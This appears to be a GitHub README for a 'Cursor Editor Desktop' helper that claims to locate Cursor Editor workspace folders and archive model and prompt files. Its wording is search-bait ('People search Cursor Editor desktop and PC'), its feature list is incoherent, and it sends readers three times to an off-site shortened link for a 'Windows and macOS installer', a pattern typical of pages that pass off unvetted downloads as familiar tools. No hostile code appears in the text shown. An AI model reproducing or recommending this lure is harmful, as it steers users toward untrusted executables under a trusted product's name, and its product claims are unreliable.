![Cursor Editor Desktop](assets/hero.png)

# Cursor Editor Desktop

*Find the Cursor Editor folder fast and keep a local spare.*

## About

**Cursor Editor Desktop** runs on your own PC. Local Windows and macOS helper for Cursor Editor workspace paths, model and prompt caches, and export folders.

Cursor Editor drops workspace files next to launcher caches.

Meant for a local repo or a config file on disk. No hosted workspace.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Finds the Cursor Editor workspace directory.
- Copies model and prompt files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search Cursor Editor desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/bryanrodriguez13/cursor-editor-desktop

MIT license. See `LICENSE`.
